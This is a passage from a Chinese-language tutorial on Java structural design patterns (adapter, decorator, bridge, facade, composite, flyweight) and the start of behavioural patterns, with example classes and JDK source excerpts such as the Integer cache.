，实现所有方法。而此时我们只需要继承该抽象类即可。\n\n应用场景\n以前开发的系统存在满足新系统功能需求的类，但其接口同新系统的接口不一致。\n使用第三方提供的组件，但组件接口定义和自己要求的接口定义不同。\n\n主要是接口不同，根据开闭原则，尽可能不要修改之前的系统，而是通过适配器进行新旧系统的对接。\n类适配器和对象适配器的区别\n对象适配器持有目标适配者的对象，是动态的方式；而类适配器通过继承目标适配者类，实现适配，是静态的方式。\n对象适配器采用动态的方式与目标适配者链结，所以它可以对不同的目标适配者及其子类进行适配。\n类适配器可以重新定义实现行为（重写覆盖），而对象适配器则比较困难，但添加行为比较方便。\n\n尽量使用对象适配器遵循合成复用原则，多合成（接口）&#x2F;聚合，少继承。\nJDK中的应用（InputStreamReader）Reader（字符流）、InputStream（字节流）的适配使用的是InputStreamReader。InputStreamReader继承自java.io包中的Reader，对他中的抽象的未实现的方法给出实现。如：\npublic int read() throws IOException &#123;    return sd.read();&#125;public int read(char cbuf[], int offset, int length) throws IOException &#123;    return sd.read(cbuf, offset, length);&#125;\n\n如上代码中的sd（StreamDecoder类对象），在Sun的JDK实现中，实际的方法实现是对sun.nio.cs.StreamDecoder类的同名方法的调用封装。类结构图如下：\n\n从上图可以看出：\n\nInputStreamReader是对同样实现了Reader的StreamDecoder的封装。\nStreamDecoder不是Java SE API中的内容，是Sun JDK给出的自身实现。但我们知道他们对构造方法中的字节流类（InputStream）进行封装，并通过该类进行了字节流和字符流之间的解码转换。\n\n结论：从表层来看，InputStreamReader做了InputStream字节流类到Reader字符流之间的转换。而从如上Sun JDK中的实现类关系结构中可以看出，是StreamDecoder的设计实现在实际上采用了适配器模式。\n装饰者模式概述我们先来看一个快餐店的例子。快餐店有炒面、炒饭这些快餐，可以额外附加鸡蛋、火腿、培根这些配菜，当然加配菜需要额外加钱，每个配菜的价钱通常不太一样，那么计算总价就会显得比较麻烦。\n\n使用继承的方式存在的问题：\n\n扩展性不好如果要再加一种配料（火腿肠），我们就会发现需要给FriedRice和FriedNoodles分别定义一个子类。如果要新增一个快餐品类（炒河粉）的话，就需要定义更多的子类。\n产生过多的子类\n\n定义：指在不改变现有对象结构的情况下，动态地给该对象增加一些职责（即增加其额外功能）的模式。\n结构装饰（Decorator）模式中的角色：\n\n抽象构件（Component）角色 ：定义一个抽象接口以规范准备接收附加责任的对象。\n具体构件（Concrete Component）角色 ：实现抽象构件，通过装饰角色为其添加一些职责。\n抽象装饰（Decorator）角色 ： 继承或实现抽象构件，并包含具体构件的实例，可以通过其子类扩展具体构件的功能。\n具体装饰（ConcreteDecorator）角色 ：实现抽象装饰的相关方法，并给具体构件对象添加附加的责任。\n\n案例我们使用装饰者模式对快餐店案例进行改进，体会装饰者模式的精髓。\n类图如下：\n代码如下：\n//快餐接口public abstract class FastFood &#123;    private float price;    private String desc;    public FastFood() &#123;    &#125;    public FastFood(float price, String desc) &#123;        this.price = price;        this.desc = desc;    &#125;    public void setPrice(float price) &#123;        this.price = price;    &#125;    public float getPrice() &#123;        return price;    &#125;    public String getDesc() &#123;        return desc;    &#125;    public void setDesc(String desc) &#123;        this.desc = desc;    &#125;    public abstract float cost();  //获取价格&#125;//炒饭public class FriedRice extends FastFood &#123;    public FriedRice() &#123;        super(10, &quot;炒饭&quot;);    &#125;    public float cost() &#123;        return getPrice();    &#125;&#125;//炒面public class FriedNoodles extends FastFood &#123;    public FriedNoodles() &#123;        super(12, &quot;炒面&quot;);    &#125;    public float cost() &#123;        return getPrice();    &#125;&#125;//配料类public abstract class Garnish extends FastFood &#123;    private FastFood fastFood;    public FastFood getFastFood() &#123;        return fastFood;    &#125;    public void setFastFood(FastFood fastFood) &#123;        this.fastFood = fastFood;    &#125;    public Garnish(FastFood fastFood, float price, String desc) &#123;        super(price,desc);        this.fastFood = fastFood;    &#125;&#125;//鸡蛋配料public class Egg extends Garnish &#123;    public Egg(FastFood fastFood) &#123;        super(fastFood,1,&quot;鸡蛋&quot;);    &#125;    public float cost() &#123;        return getPrice() + getFastFood().getPrice();    &#125;    @Override    public String getDesc() &#123;        return super.getDesc() + getFastFood().getDesc();    &#125;&#125;//培根配料public class Bacon extends Garnish &#123;    public Bacon(FastFood fastFood) &#123;        super(fastFood,2,&quot;培根&quot;);    &#125;    @Override    public float cost() &#123;        return getPrice() + getFastFood().getPrice();    &#125;    @Override    public String getDesc() &#123;        return super.getDesc() + getFastFood().getDesc();    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        //点一份炒饭        FastFood food = new FriedRice();        //花费的价格        System.out.println(food.getDesc() + &quot; &quot; + food.cost() + &quot;元&quot;);        System.out.println(&quot;========&quot;);        //点一份加鸡蛋的炒饭        FastFood food1 = new FriedRice();        food1 = new Egg(food1);        //花费的价格        System.out.println(food1.getDesc() + &quot; &quot; + food1.cost() + &quot;元&quot;);        System.out.println(&quot;========&quot;);        //点一份加培根的炒面        FastFood food2 = new FriedNoodles();        food2 = new Bacon(food2);        //花费的价格        System.out.println(food2.getDesc() + &quot; &quot; + food2.cost() + &quot;元&quot;);    &#125;&#125;\n\n好处：\n\n饰者模式可以带来比继承更加灵活性的扩展功能，使用更加方便，可以通过组合不同的装饰者对象来获取具有不同行为状态的多样化的结果。装饰者模式比继承更具良好的扩展性，完美地遵循开闭原则，继承是静态的附加责任，装饰者则是动态的附加责任。\n装饰类和被装饰类可以独立发展，不会相互耦合，装饰模式是继承的一个替代模式，装饰模式可以动态扩展一个实现类的功能。\n\n缺点：\n\n多层装饰比较复杂，提高了系统的复杂度。不利于我们调试。\n\n使用场景\n当不能采用继承的方式对系统进行扩充或者采用继承不利于系统扩展和维护时。不能采用继承的情况主要有两类：\n第一类是系统中存在大量独立的扩展，为支持每一种组合将产生大量的子类，使得子类数目呈爆炸性增长；\n第二类是因为类定义不能继承（如final类）\n\n\n在不影响其他对象的情况下，以动态、透明的方式给单个对象添加职责。\n当对象的功能要求可以动态地添加，也可以再动态地撤销时。\n\nJDK中的应用（IO流）IO流中的包装类使用到了装饰者模式。BufferedInputStream，BufferedOutputStream，BufferedReader，BufferedWriter。我们以BufferedWriter举例来说明，先看看如何使用BufferedWriter\npublic class Client &#123;    public static void main(String[] args) throws Exception&#123;        //创建BufferedWriter对象        //创建FileWriter对象        FileWriter fw = new FileWriter(&quot;C:\\\\Users\\\\Think\\\\Desktop\\\\a.txt&quot;);        BufferedWriter bw = new BufferedWriter(fw);        //写数据        bw.write(&quot;hello Buffered&quot;);        bw.close();    &#125;&#125;\n\n使用起来感觉确实像是装饰者模式，接下来看它们的结构：\n\n\nBufferedWriter使用装饰者模式对Writer子实现类进行了增强，添加了缓冲区，提高了写数据的效率。\n\n代理和装饰者的区别静态代理和装饰者模式的区别：\n\n相同点：\n都要实现与目标类相同的业务接口\n在两个类中都要声明目标对象\n都可以在不修改目标类的前提下增强目标方法\n\n\n不同点：\n目的不同装饰者是为了增强目标对象静态代理是为了保护和隐藏目标对象\n获取目标对象构建的地方不同装饰者是由外界传递进来，可以通过构造方法传递静态代理是在代理类内部创建，以此来隐藏目标对象\n\n\n\n桥接模式概述现在有一个需求，需要创建不同的图形，并且每个图形都有可能会有不同的颜色。我们可以利用继承的方式来设计类的关系：\n\n我们可以发现有很多的类，假如我们再增加一个形状或再增加一种颜色，就需要创建更多的类。试想，在一个有多种可能会变化的维度的系统中，用继承方式会造成类爆炸，扩展起来不灵活。每次在一个维度上新增一个具体实现都要增加多个子类。为了更加灵活的设计系统，我们此时可以考虑使用桥接模式。\n定义：将抽象与实现分离，使它们可以独立变化。它是用组合关系代替继承关系来实现，从而降低了抽象和实现这两个可变维度的耦合度。\n结构桥接（Bridge）模式包含以下主要角色：\n\n抽象化（Abstraction）角色 ：定义抽象类，并包含一个对实现化对象的引用。\n扩展抽象化（Refined  Abstraction）角色 ：是抽象化角色的子类，实现父类中的业务方法，并通过组合关系调用实现化角色中的业务方法。\n实现化（Implementor）角色 ：定义实现化角色的接口，供扩展抽象化角色调用。\n具体实现化（Concrete Implementor）角色 ：给出实现化角色接口的具体实现。\n\n案例例：视频播放器需要开发一个跨平台视频播放器，可以在不同操作系统平台（如Windows、Mac、Linux等）上播放多种格式的视频文件，常见的视频格式包括RMVB、AVI、WMV等。该播放器包含了两个维度，适合使用桥接模式。\n类图如下：\n代码如下：\n//视频文件public interface VideoFile &#123;    void decode(String fileName);&#125;//avi文件public class AVIFile implements VideoFile &#123;    public void decode(String fileName) &#123;        System.out.println(&quot;avi视频文件：&quot;+ fileName);    &#125;&#125;//rmvb文件public class REVBBFile implements VideoFile &#123;    public void decode(String fileName) &#123;        System.out.println(&quot;rmvb文件：&quot; + fileName);    &#125;&#125;//操作系统版本public abstract class OperatingSystemVersion &#123;    protected VideoFile videoFile;    public OperatingSystemVersion(VideoFile videoFile) &#123;        this.videoFile = videoFile;    &#125;    public abstract void play(String fileName);&#125;//Windows版本public class Windows extends OperatingSystemVersion &#123;    public Windows(VideoFile videoFile) &#123;        super(videoFile);    &#125;    public void play(String fileName) &#123;        videoFile.decode(fileName);    &#125;&#125;//mac版本public class Mac extends OperatingSystemVersion &#123;    public Mac(VideoFile videoFile) &#123;        super(videoFile);    &#125;    public void play(String fileName) &#123;\t\tvideoFile.decode(fileName);    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;       OperatingSystemVersion os = new Windows(new AVIFile());        os.play(&quot;战狼3&quot;);    &#125;&#125;\n\n好处：\n\n桥接模式提高了系统的可扩充性，在两个变化维度中任意扩展一个维度，都不需要修改原有系统。如：如果现在还有一种视频文件类型wmv，我们只需要再定义一个类实现VideoFile接口即可，其他类不需要发生变化。\n实现细节对客户透明\n\n使用场景\n当一个类存在两个独立变化的维度，且这两个维度都需要进行扩展时。\n当一个系统不希望使用继承或因为多层次继承导致系统类的个数急剧增加时。\n当一个系统需要在构件的抽象化角色和具体化角色之间增加更多的灵活性时。避免在两个层次之间建立静态的继承联系，通过桥接模式可以使它们在抽象层建立一个关联关系。\n\n外观模式概述有些人可能炒过股票，但其实大部分人都不太懂，这种没有足够了解证券知识的情况下做股票是很容易亏钱的，刚开始炒股肯定都会想，如果有个懂行的帮帮手就好.其实基金就是个好帮手，支付宝里就有许多的基金，它将投资者分散的资金集中起来，交由专业的经理人进行管理，投资于股票、债券、外汇等领域，而基金投资的收益归持有者所有，管理机构收取一定比例的托管管理费用。\n定义：又名门面模式，是一种通过为多个复杂的子系统提供一个一致的接口，而使这些子系统更加容易被访问的模式。该模式对外有一个统一接口，外部应用程序不用关心内部子系统的具体的细节，这样会大大降低应用程序的复杂度，提高了程序的可维护性。\n外观（Facade）模式是“迪米特法则”的典型应用\n\n结构外观（Facade）模式包含以下主要角色：\n\n外观（Facade）角色：为多个子系统对外提供一个共同的接口。\n子系统（Sub System）角色：实现系统的部分功能，客户可以通过外观角色访问它。\n\n案例例：智能家电控制小明的爷爷已经60岁了，一个人在家生活：每次都需要打开灯、打开电视、打开空调；睡觉时关闭灯、关闭电视、关闭空调；操作起来都比较麻烦。所以小明给爷爷买了智能音箱，可以通过语音直接控制这些智能家电的开启和关闭。类图如下：\n\n代码如下：\n//灯类public class Light &#123;    public void on() &#123;        System.out.println(&quot;打开了灯....&quot;);    &#125;    public void off() &#123;        System.out.println(&quot;关闭了灯....&quot;);    &#125;&#125;//电视类public class TV &#123;    public void on() &#123;        System.out.println(&quot;打开了电视....&quot;);    &#125;    public void off() &#123;        System.out.println(&quot;关闭了电视....&quot;);    &#125;&#125;//控制类public class AirCondition &#123;    public void on() &#123;        System.out.println(&quot;打开了空调....&quot;);    &#125;    public void off() &#123;        System.out.println(&quot;关闭了空调....&quot;);    &#125;&#125;//智能音箱public class SmartAppliancesFacade &#123;    private Light light;    private TV tv;    private AirCondition airCondition;    public SmartAppliancesFacade() &#123;        light = new Light();        tv = new TV();        airCondition = new AirCondition();    &#125;    public void say(String message) &#123;        if(message.contains(&quot;打开&quot;)) &#123;            on();        &#125; else if(message.contains(&quot;关闭&quot;)) &#123;            off();        &#125; else &#123;            System.out.println(&quot;我还听不懂你说的！！！&quot;);        &#125;    &#125;    //起床后一键开电器    private void on() &#123;        System.out.println(&quot;起床了&quot;);        light.on();        tv.on();        airCondition.on();    &#125;    //睡觉一键关电器    private void off() &#123;        System.out.println(&quot;睡觉了&quot;);        light.off();        tv.off();        airCondition.off();    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        //创建外观对象        SmartAppliancesFacade facade = new SmartAppliancesFacade();        //客户端直接与外观对象进行交互        facade.say(&quot;打开家电&quot;);        facade.say(&quot;关闭家电&quot;);    &#125;&#125;\n\n好处：\n\n降低了子系统与客户端之间的耦合度，使得子系统的变化不会影响调用它的客户类。\n对客户屏蔽了子系统组件，减少了客户处理的对象数目，并使得子系统使用起来更加容易。\n\n缺点：\n\n不符合开闭原则，修改很麻烦\n\n使用场景\n对分层结构系统构建时，使用外观模式定义子系统中每层的入口点可以简化子系统之间的依赖关系。\n当一个复杂系统的子系统很多时，外观模式可以为系统设计一个简单的接口供外界访问。\n当客户端与多个子系统之间存在很大的联系时，引入外观模式可将它们分离，从而提高子系统的独立性和可移植性。\n\n源码解析使用tomcat作为web容器时，接收浏览器发送过来的请求，tomcat会将请求信息封装成ServletRequest对象，如下图①处对象。但是大家想想ServletRequest是一个接口，它还有一个子接口HttpServletRequest，而我们知道该request对象肯定是一个HttpServletRequest对象的子实现类对象，到底是哪个类的对象呢？可以通过输出request对象，我们就会发现是一个名为RequestFacade的类的对象。\n\nRequestFacade类就使用了外观模式。先看结构图：\n\n为什么在此处使用外观模式呢？定义 RequestFacade 类，分别实现 ServletRequest 和 HttpServletRequest ，同时定义私有成员变量 Request ，并且方法的实现调用 Request  的实现。然后，将 RequestFacade上转为 ServletRequest  传给 servlet 的 service 方法，这样即使在 servlet 中被下转为 RequestFacade ，也不能访问私有成员变量对象中的方法。既用了 Request ，又能防止其中方法被不合理的访问。\n组合模式概述\n对于这个图片肯定会非常熟悉，上图我们可以看做是一个文件系统，对于这样的结构我们称之为树形结构。在树形结构中可以通过调用某个方法来遍历整个树，当我们找到某个叶子节点后，就可以对叶子节点进行相关的操作。可以将这颗树理解成一个大的容器，容器里面包含很多的成员对象，这些成员对象即可是容器对象也可以是叶子对象。但是由于容器对象和叶子对象在功能上面的区别，使得我们在使用的过程中必须要区分容器对象和叶子对象，但是这样就会给客户带来不必要的麻烦，作为客户而已，它始终希望能够一致地对待容器对象和叶子对象。\n定义：又名部分整体模式，是用于把一组相似的对象当作一个单一的对象。组合模式依据树形结构来组合对象，用来表示部分以及整体层次。这种类型的设计模式属于结构型模式，它创建了对象组的树形结构。\n结构组合模式主要包含三种角色：\n\n抽象根节点（Component）：定义系统各层次对象的共有方法和属性，可以预先定义一些默认行为和属性。\n树枝节点（Composite）：定义树枝节点的行为，存储子节点，组合树枝节点和叶子节点形成一个树形结构。\n叶子节点（Leaf）：叶子节点对象，其下再无分支，是系统层次遍历的最小单位。\n\n案例实现例：软件菜单如下图，我们在访问别的一些管理系统时，经常可以看到类似的菜单。一个菜单可以包含菜单项（菜单项是指不再包含其他内容的菜单条目），也可以包含带有其他菜单项的菜单。因此使用组合模式描述菜单就很恰当，我们的需求是针对一个菜单，打印出其包含的所有菜单以及菜单项的名称。\n\n要实现该案例，我们先画出类图：\n\n代码实现：不管是菜单还是菜单项，都应该继承自统一的接口，这里姑且将这个统一的接口称为菜单组件。\n//菜单组件  不管是菜单还是菜单项，都应该继承该类public abstract class MenuComponent &#123;    protected String name;    protected int level;    //添加菜单    public void add(MenuComponent menuComponent)&#123;        throw new UnsupportedOperationException();    &#125;    //移除菜单    public void remove(MenuComponent menuComponent)&#123;        throw new UnsupportedOperationException();    &#125;    //获取指定的子菜单    public MenuComponent getChild(int i)&#123;        throw new UnsupportedOperationException();    &#125;    //获取菜单名称    public String getName()&#123;        return name;    &#125;    public void print()&#123;        throw new UnsupportedOperationException();    &#125;&#125;\n\n这里的MenuComponent定义为抽象类，因为有一些共有的属性和行为要在该类中实现。Menu和MenuItem类就可以只覆盖自己感兴趣的方法，而不用搭理不需要或者不感兴趣的方法。举例来说，Menu类可以包含子菜单，因此需要覆盖add()、remove()、getChild()方法，但是MenuItem就不应该有这些方法。这里给出的默认实现是抛出异常，你也可以根据自己的需要改写默认实现。\npublic class Menu extends MenuComponent &#123;    private List&lt;MenuComponent&gt; menuComponentList;    public Menu(String name,int level)&#123;        this.level = level;        this.name = name;        menuComponentList = new ArrayList&lt;MenuComponent&gt;();    &#125;    @Override    public void add(MenuComponent menuComponent) &#123;        menuComponentList.add(menuComponent);    &#125;    @Override    public void remove(MenuComponent menuComponent) &#123;        menuComponentList.remove(menuComponent);    &#125;    @Override    public MenuComponent getChild(int i) &#123;        return menuComponentList.get(i);    &#125;    @Override    public void print() &#123;        for (int i = 1; i &lt; level; i++) &#123;            System.out.print(&quot;--&quot;);        &#125;        System.out.println(name);        for (MenuComponent menuComponent : menuComponentList) &#123;            menuComponent.print();        &#125;    &#125;&#125;\n\nMenu类已经实现了除了getName方法的其他所有方法，因为Menu类具有添加菜单，移除菜单和获取子菜单的功能。\npublic class MenuItem extends MenuComponent &#123;    public MenuItem(String name,int level) &#123;        this.name = name;        this.level = level;    &#125;    @Override    public void print() &#123;        for (int i = 1; i &lt; level; i++) &#123;            System.out.print(&quot;--&quot;);        &#125;        System.out.println(name);    &#125;&#125;\n\nMenuItem是菜单项，不能再有子菜单，所以添加菜单，移除菜单和获取子菜单的功能并不能实现。\npublic class Client &#123;    public static void main(String[] args) &#123;        // 创建菜单树        MenuComponent menu1 = new Menu(&quot;菜单管理&quot;,2);        menu1.add(new MenuItem(&quot;页面访问&quot;,3));        menu1.add(new MenuItem(&quot;展开菜单&quot;,3));        menu1.add(new MenuItem(&quot;编辑菜单&quot;,3));        menu1.add(new MenuItem(&quot;删除菜单&quot;,3));        menu1.add(new MenuItem(&quot;新增菜单&quot;,3));        MenuComponent menu2 = new Menu(&quot;权限管理&quot;,2);        menu2.add(new MenuItem(&quot;页面访问&quot;,3));        menu2.add(new MenuItem(&quot;提交保存&quot;,3));        MenuComponent menu3 = new Menu(&quot;角色管理&quot;,2);        menu3.add(new MenuItem(&quot;页面访问&quot;,3));        menu3.add(new MenuItem(&quot;新增角色&quot;,3));        menu3.add(new MenuItem(&quot;修改角色&quot;,3));        // 创建一级菜单        MenuComponent component = new Menu(&quot;系统管理&quot;,1);        // 将二级菜单添加到一级菜单        component.add(menu1);        component.add(menu2);        component.add(menu3);        // 打印菜单名称（递归打印）        component.print();    &#125;&#125;\n\n组合模式的分类在使用组合模式时，根据抽象构件类的定义形式，我们可将组合模式分为透明组合模式和安全组合模式两种形式。\n\n透明组合模式\n透明组合模式中，抽象根节点角色中声明了所有用于管理成员对象的方法，比如在示例中 MenuComponent 声明了 add、remove 、getChild 方法，这样做的好处是确保所有的构件类都有相同的接口。透明组合模式也是组合模式的标准形式。\n透明组合模式的缺点是不够安全，因为叶子对象和容器对象在本质上是有区别的，叶子对象不可能有下一个层次的对象，即不可能包含成员对象，因此为其提供 add()、remove() 等方法是没有意义的，这在编译阶段不会出错，但在运行阶段如果调用这些方法可能会出错（如果没有提供相应的错误处理代码）\n\n\n安全组合模式\n在安全组合模式中，在抽象构件角色中没有声明任何用于管理成员对象的方法，而是在树枝节点 Menu 类中声明并实现这些方法。安全组合模式的缺点是不够透明，因为叶子构件和容器构件具有不同的方法，且容器构件中那些用于管理成员对象的方法没有在抽象构件类中定义，因此客户端不能完全针对抽象编程，必须有区别地对待叶子构件和容器构件。\n\n\n\n\n优点\n组合模式可以清楚地定义分层次的复杂对象，表示对象的全部或部分层次，它让客户端忽略了层次的差异，方便对整个层次结构进行控制。\n客户端可以一致地使用一个组合结构或其中单个对象，不必关心处理的是单个对象还是整个组合结构，简化了客户端代码。\n在组合模式中增加新的树枝节点和叶子节点都很方便，无须对现有类库进行任何修改，符合“开闭原则”。\n组合模式为树形结构的面向对象实现提供了一种灵活的解决方案，通过叶子节点和树枝节点的递归组合，可以形成复杂的树形结构，但对树形结构的控制却非常简单。\n\n使用场景组合模式正是应树形结构而生，所以组合模式的使用场景就是出现树形结构的地方。比如：文件目录显示，多级目录呈现等树形结构数据的操作。\n享元模式概述定义：运用共享技术来有效地支持大量细粒度对象的复用。它通过共享已经存在的对象来大幅度减少需要创建的对象数量、避免大量相似对象的开销，从而提高系统资源的利用率。\n结构享元（Flyweight ）模式中存在以下两种状态：\n\n内部状态，即不会随着环境的改变而改变的可共享部分。\n外部状态，指随环境改变而改变的不可以共享的部分。享元模式的实现要领就是区分应用中的这两种状态，并将外部状态外部化。\n\n享元模式的主要有以下角色：\n\n抽象享元角色（Flyweight）：通常是一个接口或抽象类，在抽象享元类中声明了具体享元类公共的方法，这些方法可以向外界提供享元对象的内部数据（内部状态），同时也可以通过这些方法来设置外部数据（外部状态）。\n具体享元（Concrete Flyweight）角色 ：它实现了抽象享元类，称为享元对象；在具体享元类中为内部状态提供了存储空间。通常我们可以结合单例模式来设计具体享元类，为每一个具体享元类提供唯一的享元对象。\n非享元（Unsharable Flyweight)角色 ：并不是所有的抽象享元类的子类都需要被共享，不能被共享的子类可设计为非共享具体享元类；当需要一个非共享具体享元类的对象时可以直接通过实例化创建。\n享元工厂（Flyweight Factory）角色 ：负责创建和管理享元角色。当客户对象请求一个享元对象时，享元工厂检査系统中是否存在符合要求的享元对象，如果存在则提供给客户；如果不存在的话，则创建一个新的享元对象。\n\n案例实现例：俄罗斯方块下面的图片是众所周知的俄罗斯方块中的一个个方块，如果在俄罗斯方块这个游戏中，每个不同的方块都是一个实例对象，这些对象就要占用很多的内存空间，下面利用享元模式进行实现。\n\n先来看类图：\n\n代码如下：俄罗斯方块有不同的形状，我们可以对这些形状向上抽取出AbstractBox，用来定义共性的属性和行为。\npublic abstract class AbstractBox &#123;    public abstract String getShape();    public void display(String color) &#123;        System.out.println(&quot;方块形状：&quot; + this.getShape() + &quot; 颜色：&quot; + color);    &#125;&#125;\n\n接下来就是定义不同的形状了，IBox类、LBox类、OBox类等。\npublic class IBox extends AbstractBox &#123;    @Override    public String getShape() &#123;        return &quot;I&quot;;    &#125;&#125;public class LBox extends AbstractBox &#123;    @Override    public String getShape() &#123;        return &quot;L&quot;;    &#125;&#125;public class OBox extends AbstractBox &#123;    @Override    public String getShape() &#123;        return &quot;O&quot;;    &#125;&#125;\n\n提供了一个工厂类（BoxFactory），用来管理享元对象（也就是AbstractBox子类对象），该工厂类对象只需要一个，所以可以使用单例模式。并给工厂类提供一个获取形状的方法。\npublic class BoxFactory &#123;    private static HashMap&lt;String, AbstractBox&gt; map;    private BoxFactory() &#123;        map = new HashMap&lt;String, AbstractBox&gt;();        AbstractBox iBox = new IBox();        AbstractBox lBox = new LBox();        AbstractBox oBox = new OBox();        map.put(&quot;I&quot;, iBox);        map.put(&quot;L&quot;, lBox);        map.put(&quot;O&quot;, oBox);    &#125;    public static final BoxFactory getInstance() &#123;        return SingletonHolder.INSTANCE;    &#125;    private static class SingletonHolder &#123;        private static final BoxFactory INSTANCE = new BoxFactory();    &#125;    public AbstractBox getBox(String key) &#123;        return map.get(key);    &#125;&#125;\n\n测试类\npublic class Client &#123;    public static void main(String[] args) &#123;        // 获取I图形        AbstractBox box1 = BoxFactory.getInstance().getBox(&quot;I&quot;);        box1.display(&quot;灰色&quot;);        // 获取:图形        AbstractBox box2 = BoxFactory.getInstance().getBox(&quot;L&quot;);        box2.display(&quot;红色&quot;);        // 获取O图形        AbstractBox box3 = BoxFactory.getInstance().getBox(&quot;O&quot;);        box3.display(&quot;灰色&quot;);        // 获取O图形        AbstractBox box4 = BoxFactory.getInstance().getBox(&quot;O&quot;);        box4.display(&quot;白色&quot;);        System.out.println(&quot;两次获取到的O对象是否为同一对象:&quot; + (box3 == box4));    &#125;&#125;\n\n优缺点和使用场景\n优点\n极大减少内存中相似或相同对象数量，节约系统资源，提供系统性能\n享元模式中的外部状态相对独立，且不影响内部状态\n\n\n缺点：为了使对象可以共享，需要将享元对象的部分状态外部化，分离内部状态和外部状态，使程序逻辑复杂\n使用场景：\n一个系统有大量相同或者相似的对象，造成内存的大量耗费。\n对象的大部分状态都可以外部化，可以将这些外部状态传入对象中。\n在使用享元模式时需要维护一个存储享元对象的享元池，而这需要耗费一定的系统资源，因此，应当在需要多次重复使用享元对象时才值得使用享元模式。\n\n\n\nJDK中的应用（Integer类）Integer类使用了享元模式。先看下面的例子：\npublic class Client &#123;    public static void main(String[] args) &#123;        Integer i1 = 127;        Integer i2 = 127;        System.out.println(&quot;i1和i2对象是否是同一个对象？&quot; + (i1 == i2));        Integer i3 = 128;        Integer i4 = 128;        System.out.println(&quot;i3和i4对象是否是同一个对象？&quot; + (i3 == i4));    &#125;&#125;\n\n运行上面代码，结果如下：\n\n为什么第一个输出语句输出的是true，第二个输出语句输出的是false？通过反编译软件进行反编译，代码如下：\npublic class Client &#123;    public static void main(String[] args) &#123;        Integer i1 = Integer.valueOf((int)127);        Integer i2 = Integer.valueOf((int)127);        System.out.println((String)new StringBuilder().append((String)&quot;i1\\u548ci2\\u5bf9\\u8c61\\u662f\\u5426\\u662f\\u540c\\u4e00\\u4e2a\\u5bf9\\u8c61\\uff1f&quot;).append((boolean)(i1 == i2)).toString());        Integer i3 = Integer.valueOf((int)128);        Integer i4 = Integer.valueOf((int)128);        System.out.println((String)new StringBuilder().append((String)&quot;i3\\u548ci4\\u5bf9\\u8c61\\u662f\\u5426\\u662f\\u540c\\u4e00\\u4e2a\\u5bf9\\u8c61\\uff1f&quot;).append((boolean)(i3 == i4)).toString());    &#125;&#125;\n\n上面代码可以看到，直接给Integer类型的变量赋值基本数据类型数据的操作底层使用的是 valueOf() ，所以只需要看该方法即可\npublic final class Integer extends Number implements Comparable&lt;Integer&gt; &#123;    \tpublic static Integer valueOf(int i) &#123;        if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)            return IntegerCache.cache[i + (-IntegerCache.low)];        return new Integer(i);    &#125;        private static class IntegerCache &#123;        static final int low = -128;        static final int high;        static final Integer cache[];        static &#123;            int h = 127;            String integerCacheHighPropValue =                sun.misc.VM.getSavedProperty(&quot;java.lang.Integer.IntegerCache.high&quot;);            if (integerCacheHighPropValue != null) &#123;                try &#123;                    int i = parseInt(integerCacheHighPropValue);                    i = Math.max(i, 127);                    // Maximum array size is Integer.MAX_VALUE                    h = Math.min(i, Integer.MAX_VALUE - (-low) -1);                &#125; catch( NumberFormatException nfe) &#123;                &#125;            &#125;            high = h;            cache = new Integer[(high - low) + 1];            int j = low;            for(int k = 0; k &lt; cache.length; k++)                cache[k] = new Integer(j++);            // range [-128, 127] must be interned (JLS7 5.1.7)            assert IntegerCache.high &gt;= 127;        &#125;        private IntegerCache() &#123;&#125;    &#125;&#125;\n\n可以看到 Integer 默认先创建并缓存 -128 ~ 127 之间数的 Integer 对象，当调用 valueOf 时如果参数在 -128 ~ 127 之间则计算下标并从缓存中返回，否则创建一个新的 Integer 对象。\n行为型模式行为型模式用于描述程序在运行时复杂的流程控制，即描述多个类或对象之间怎样相互协作共同完成单个对象都无法单独完成的任务，它涉及算法与对象间职责的分配。\n行为型模式分为类行为模式和对象行为模式，前者采用继承机制来在类间分派行为，后者采用组合或聚合在对象间分配行为。由于组合关系或聚合关系比继承关系耦合度低，满足“合成复用原则”，所以对象行为模式比类行为模式具有更大的灵活性。\n行为型模式分为：\n\n模板方法模式\n策略模式\n命令模式\n职责链模式\n状态模式\n观察者模式\n中介者模式\n迭代器模式\n访问者模式\n备忘录模式\n解释器模式\n\n以上 11 种行为型模式，除了模板方法模式和解释器模式是类行为型模式，其他的全部属于对象行为型模式。\n模板方法模式概述在面向对象程序设计过程中，程序员常常会遇到这种情况：设计一个系统时知道了算法所需的关键步骤，而且确定了这些步骤的执行顺序，但某些步骤的具体实现还未知，或者说某些步骤的实现与具体的环境相关。\n例如，去银行办理业务一般要经过以下4个流程：取号、排队、办理具体业务、对银行工作人员进行评分等，其中取号、排队和对银行工作人员进行评分的业务对每个客户是一样的，可以在父类中实现，但是办理具体业务却因人而异，它可能是存款、取款或者转账等，可以延迟到子类中实现。\n定义：定义一个操作中的算法骨架，而将算法的一些步骤延迟到子类中，使得子类可以不改变该算法结构的情况下重定义该算法的某些特定步骤。\n结构模板方法（Template Method）模式包含以下主要角色：\n\n抽象类（Abstract Class）：负责给出一个算法的轮廓和骨架。它由一个模板方法和若干个基本方法构成。\n模板方法：定义了算法的骨架，按某种顺序调用其包含的基本方法。\n基本方法：是实现算法各个步骤的方法，是模板方法的组成部分。基本方法又可以分为三种：\n抽象方法(Abstract Method) ：一个抽象方法由抽象类声明、由其具体子类实现。\n具体方法(Concrete Method) ：一个具体方法由一个抽象类或具体类声明并实现，其子类可以进行覆盖也可以直接继承。\n钩子方法(Hook Method) ：在抽象类中已经实现，包括用于判断的逻辑方法和需要子类重写的空方法两种。一般钩子方法是用于判断的逻辑方法，这类方法名一般为isXxx，返回值类型为boolean类型。\n\n\n\n\n具体子类（Concrete Class）：实现抽象类中所定义的抽象方法和钩子方法，它们是一个顶级逻辑的组成步骤。\n\n案例实现例：炒菜炒菜的步骤是固定的，分为倒油、热油、倒蔬菜、倒调料品、翻炒等步骤。现通过模板方法模式来用代码模拟。类图如下：\n\n代码如下：\npublic abstract class AbstractClass &#123;        public final void cookProcess() &#123;        //第一步：倒油        this.pourOil();        //第二步：热油        this.heatOil();        //第三步：倒蔬菜        this.pourVegetable();        //第四步：倒调味料        this.pourSauce();        //第五步：翻炒        this.fry();    &#125;    public void pourOil() &#123;        System.out.println(&quot;倒油&quot;);    &#125;    //第二步：热油是一样的，所以直接实现    public void heatOil() &#123;        